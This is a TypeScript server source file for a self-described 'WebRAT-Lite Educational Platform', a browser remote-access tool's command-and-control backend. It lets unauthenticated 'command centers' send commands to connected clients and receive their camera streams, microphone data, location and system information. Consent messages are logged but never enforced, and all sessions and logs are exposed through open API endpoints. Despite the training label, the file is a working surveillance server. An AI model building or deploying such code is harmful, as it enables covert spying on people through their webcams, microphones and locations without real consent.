import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { insertSessionSchema, insertTrainingLogSchema } from "@shared/schema";
import { z } from "zod";
import { nanoid } from "nanoid";

interface ExtendedWebSocket extends WebSocket {
  sessionId?: string;
  isAlive?: boolean;
  clientType?: 'command_center' | 'client';
  linkId?: string;
}

export async function registerRoutes(app: Express): Promise<Server> {
  const httpServer = createServer(app);
  
  // API Routes
  app.get('/api/sessions', async (req, res) => {
    try {
      // Get all sessions from storage
      const sessions = Array.from((storage as any).sessions?.values() || []);
      res.json(sessions);
    } catch (error) {
      console.error('Error fetching sessions:', error);
      res.status(500).json({ error: 'Failed to fetch sessions' });
    }
  });

  app.get('/api/logs', async (req, res) => {
    try {
      // Get all training logs from storage
      const logs = Array.from((storage as any).trainingLogs?.values() || []);
      res.json(logs);
    } catch (error) {
      console.error('Error fetching logs:', error);
      res.status(500).json({ error: 'Failed to fetch logs' });
    }
  });

  app.get('/api/sessions/:id', async (req, res) => {
    try {
      const session = await storage.getSession(req.params.id);
      if (!session) {
        return res.status(404).json({ error: 'Session not found' });
      }
      res.json(session);
    } catch (error) {
      console.error('Error fetching session:', error);
      res.status(500).json({ error: 'Failed to fetch session' });
    }
  });

  app.get('/api/sessions/:id/logs', async (req, res) => {
    try {
      const logs = await storage.getTrainingLogsBySession(req.params.id);
      res.json(logs);
    } catch (error) {
      console.error('Error fetching session logs:', error);
      res.status(500).json({ error: 'Failed to fetch session logs' });
    }
  });

  app.get('/api/status', (req, res) => {
    res.json({ 
      server_status: "running",
      connected_clients: activeConnections.size,
      platform: "WebRAT-Lite Educational Platform",
      timestamp: new Date().toISOString()
    });
  });
  
  // WebSocket server setup
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  
  // Store active connections
  const activeConnections = new Map<string, ExtendedWebSocket>();
  const commandCenters = new Map<string, ExtendedWebSocket>();
  const clientConnections = new Map<string, ExtendedWebSocket>();
  
  // Heartbeat mechanism
  const heartbeat = function(this: ExtendedWebSocket) {
    this.isAlive = true;
  };
  
  // WebSocket connection handler
  wss.on('connection', (ws: ExtendedWebSocket) => {
    const sessionId = nanoid();
    ws.sessionId = sessionId;
    ws.isAlive = true;
    
    activeConnections.set(sessionId, ws);
    
    // Setup heartbeat
    ws.on('pong', heartbeat);
    
    // Send initial connection message
    ws.send(JSON.stringify({
      type: 'connection',
      sessionId,
      message: 'Connected to WebRAT-Lite Educational Platform'
    }));
    
    // Handle messages
    ws.on('message', async (data: Buffer) => {
      try {
        const message = JSON.parse(data.toString());
        
        switch (message.type) {
          case 'register_as_command_center':
            await handleCommandCenterRegistration(ws, message);
            break;
          case 'register_as_client':
            await handleClientRegistration(ws, message);
            break;
          case 'command_to_client':
            await handleCommandToClient(ws, message);
            break;
          case 'consent_given':
            await handleConsentMessage(ws, message);
            break;
          case 'permission_granted':
            await handlePermissionGranted(ws, message);
            break;
          case 'system_info':
            await handleSystemInfo(ws, message);
            break;
          case 'pong':
            await handlePong(ws, message);
            break;
          case 'permission_request':
            await handlePermissionRequest(ws, message);
            break;
          case 'browser_info':
            await handleBrowserInfo(ws, message);
            break;
          case 'training_action':
            await handleTrainingAction(ws, message);
            break;
          case 'camera_stream':
            await handleCameraStream(ws, message);
            break;
          case 'microphone_data':
            await handleMicrophoneData(ws, message);
            break;
          case 'location_data':
            await handleLocationData(ws, message);
            break;
          case 'system_info_data':
            await handleSystemInfoData(ws, message);
            break;
          default:
            ws.send(JSON.stringify({
              type: 'error',
              message: 'Unknown message type'
            }));
        }
      } catch (error) {
        console.error('WebSocket message error:', error);
        console.error('Raw message data:', data.toString());
        ws.send(JSON.stringify({
          type: 'error',
          message: 'Invalid message format'
        }));
      }
    });
    
    // Handle disconnection
    ws.on('close', () => {
      if (ws.sessionId) {
        activeConnections.delete(ws.sessionId);
        if (ws.clientType === 'command_center') {
          commandCenters.delete(ws.sessionId);
        } else if (ws.clientType === 'client') {
          clientConnections.delete(ws.sessionId);
          // Notify command centers of disconnection
          commandCenters.forEach(cc => {
            cc.send(JSON.stringify({
              type: 'client_disconnected',
              sessionId: ws.sessionId
            }));
          });
        }
      }
    });
  });
  
  // Cleanup dead connections
  const interval = setInterval(() => {
    wss.clients.forEach((ws: ExtendedWebSocket) => {
      if (ws.isAlive === false) {
        return ws.terminate();
      }
      
      ws.isAlive = false;
      ws.ping();
    });
  }, 30000);
  
  wss.on('close', () => {
    clearInterval(interval);
  });
  
  // Message handlers
  async function handleCommandCenterRegistration(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    ws.clientType = 'command_center';
    commandCenters.set(ws.sessionId, ws);
    
    ws.send(JSON.stringify({
      type: 'command_center_registered',
      sessionId: ws.sessionId,
      connectedClients: Array.from(clientConnections.values()).map(client => ({
        sessionId: client.sessionId,
        linkId: client.linkId,
        isActive: true
      }))
    }));
  }

  async function handleClientRegistration(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    ws.clientType = 'client';
    ws.linkId = message.linkId;
    clientConnections.set(ws.sessionId, ws);
    
    // Create session in storage
    try {
      await storage.createSession({
        sessionId: ws.sessionId,
        consent: false,
        browserInfo: JSON.stringify(message.browserInfo || {}),
        permissions: JSON.stringify([]),
        isActive: true,
        clientIP: null, // You can extract from request if needed
        userAgent: message.browserInfo?.userAgent || null
      });
    } catch (error) {
      console.error('Failed to create session:', error);
    }
    
    // Notify command centers of new client
    commandCenters.forEach(cc => {
      try {
        cc.send(JSON.stringify({
          type: 'client_connected',
          client: {
            sessionId: ws.sessionId,
            linkId: ws.linkId,
            browserInfo: message.browserInfo ? JSON.stringify(message.browserInfo) : null,
            isActive: true
          }
        }));
      } catch (error) {
        console.error('Failed to send client_connected message:', error);
      }
    });
  }

  async function handleCommandToClient(ws: ExtendedWebSocket, message: any) {
    console.log('Handling command to client:', message.clientId, message.command);
    const client = clientConnections.get(message.clientId);
    if (!client) {
      console.log('Client not found:', message.clientId);
      console.log('Available clients:', Array.from(clientConnections.keys()));
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Client not found'
      }));
      return;
    }
    
    console.log('Sending command to client:', message.command);
    client.send(JSON.stringify({
      type: 'command_from_server',
      command: message.command
    }));
    
    // Log the command
    try {
      await storage.createTrainingLog({
        sessionId: message.clientId,
        action: 'command_sent',
        details: JSON.stringify({
          command: message.command,
          timestamp: new Date().toISOString()
        })
      });
    } catch (error) {
      console.error('Failed to log command:', error);
    }
  }

  async function handlePermissionGranted(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'permission_granted',
        details: JSON.stringify({
          permission: message.permission,
          granted: message.granted,
          data: message.data
        })
      });
      
      // Notify command centers
      commandCenters.forEach(cc => {
        try {
          cc.send(JSON.stringify({
            type: 'client_data',
            sessionId: ws.sessionId,
            data: {
              permission: message.permission,
              granted: message.granted,
              data: message.data
            }
          }));
        } catch (error) {
          console.error('Failed to send client_data message:', error);
        }
      });
    } catch (error) {
      console.error('Failed to log permission:', error);
    }
  }

  async function handleSystemInfo(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.updateSession(ws.sessionId, {
        browserInfo: JSON.stringify(message.data)
      });
      
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'system_info_collected',
        details: JSON.stringify(message.data)
      });
      
      // Notify command centers
      commandCenters.forEach(cc => {
        try {
          cc.send(JSON.stringify({
            type: 'client_data',
            sessionId: ws.sessionId,
            data: {
              systemInfo: message.data
            }
          }));
        } catch (error) {
          console.error('Failed to send system_info message:', error);
        }
      });
    } catch (error) {
      console.error('Failed to handle system info:', error);
    }
  }

  async function handlePong(ws: ExtendedWebSocket, message: any) {
    // Simple ping/pong handling
    ws.send(JSON.stringify({
      type: 'ping_response',
      timestamp: new Date().toISOString()
    }));
  }

  async function handleConsentMessage(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      const sessionData = insertSessionSchema.parse({
        sessionId: ws.sessionId,
        consent: message.consent,
        browserInfo: JSON.stringify(message.browserInfo || {}),
        permissions: JSON.stringify([])
      });
      
      await storage.createSession(sessionData);
      
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'consent_given',
        details: `User provided consent: ${message.consent}`
      });
      
      ws.send(JSON.stringify({
        type: 'consent_acknowledged',
        sessionId: ws.sessionId
      }));
    } catch (error) {
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Failed to process consent'
      }));
    }
  }
  
  async function handlePermissionRequest(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'permission_requested',
        details: JSON.stringify({
          permission: message.permission,
          granted: message.granted
        })
      });
      
      // Update session permissions
      const session = await storage.getSession(ws.sessionId);
      if (session) {
        const permissions = JSON.parse(session.permissions || '[]');
        permissions.push({
          type: message.permission,
          granted: message.granted,
          timestamp: new Date().toISOString()
        });
        
        await storage.updateSession(ws.sessionId, {
          permissions: JSON.stringify(permissions)
        });
      }
      
      ws.send(JSON.stringify({
        type: 'permission_logged',
        permission: message.permission,
        granted: message.granted
      }));
    } catch (error) {
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Failed to log permission request'
      }));
    }
  }
  
  async function handleBrowserInfo(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.updateSession(ws.sessionId, {
        browserInfo: JSON.stringify(message.info)
      });
      
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'browser_info_updated',
        details: JSON.stringify(message.info)
      });
      
      ws.send(JSON.stringify({
        type: 'browser_info_logged'
      }));
    } catch (error) {
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Failed to update browser info'
      }));
    }
  }
  
  async function handleTrainingAction(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: message.action,
        details: message.details || ''
      });
      
      ws.send(JSON.stringify({
        type: 'training_action_logged',
        action: message.action
      }));
    } catch (error) {
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Failed to log training action'
      }));
    }
  }

  async function handleCameraStream(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'camera_stream',
        details: JSON.stringify({
          stream: message.stream,
          timestamp: new Date().toISOString()
        })
      });
      
      // Forward to command centers
      commandCenters.forEach(cc => {
        try {
          cc.send(JSON.stringify({
            type: 'camera_stream',
            sessionId: ws.sessionId,
            stream: message.stream
          }));
        } catch (error) {
          console.error('Failed to forward camera stream:', error);
        }
      });
    } catch (error) {
      console.error('Failed to handle camera stream:', error);
    }
  }

  async function handleMicrophoneData(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'microphone_data',
        details: JSON.stringify({
          data: message.data,
          timestamp: new Date().toISOString()
        })
      });
      
      // Forward to command centers
      commandCenters.forEach(cc => {
        try {
          cc.send(JSON.stringify({
            type: 'microphone_data',
            sessionId: ws.sessionId,
            data: message.data
          }));
        } catch (error) {
          console.error('Failed to forward microphone data:', error);
        }
      });
    } catch (error) {
      console.error('Failed to handle microphone data:', error);
    }
  }

  async function handleLocationData(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'location_data',
        details: JSON.stringify({
          data: message.data,
          timestamp: new Date().toISOString()
        })
      });
      
      // Forward to command centers
      commandCenters.forEach(cc => {
        try {
          cc.send(JSON.stringify({
            type: 'location_data',
            sessionId: ws.sessionId,
            data: message.data
          }));
        } catch (error) {
          console.error('Failed to forward location data:', error);
        }
      });
    } catch (error) {
      console.error('Failed to handle location data:', error);
    }
  }

  async function handleSystemInfoData(ws: ExtendedWebSocket, message: any) {
    if (!ws.sessionId) return;
    
    try {
      await storage.createTrainingLog({
        sessionId: ws.sessionId,
        action: 'system_info_data',
        details: JSON.stringify({
          data: message.data,
          timestamp: new Date().toISOString()
        })
      });
      
      // Forward to command centers
      commandCenters.forEach(cc => {
        try {
          cc.send(JSON.stringify({
            type: 'system_info_data',
            sessionId: ws.sessionId,
            data: message.data
          }));
        } catch (error) {
          console.error('Failed to forward system info data:', error);
        }
      });
    } catch (error) {
      console.error('Failed to handle system info data:', error);
    }
  }
  
  // API endpoints
  app.get('/api/sessions/:sessionId', async (req, res) => {
    try {
      const session = await storage.getSession(req.params.sessionId);
      if (!session) {
        return res.status(404).json({ message: 'Session not found' });
      }
      res.json(session);
    } catch (error) {
      res.status(500).json({ message: 'Failed to fetch session' });
    }
  });
  
  app.get('/api/sessions/:sessionId/logs', async (req, res) => {
    try {
      const logs = await storage.getTrainingLogsBySession(req.params.sessionId);
      res.json(logs);
    } catch (error) {
      res.status(500).json({ message: 'Failed to fetch logs' });
    }
  });
  
  app.get('/api/status', (req, res) => {
    res.json({
      connected_clients: activeConnections.size,
      server_status: 'running',
      platform: 'WebRAT-Lite Educational Platform'
    });
  });

  return httpServer;
}
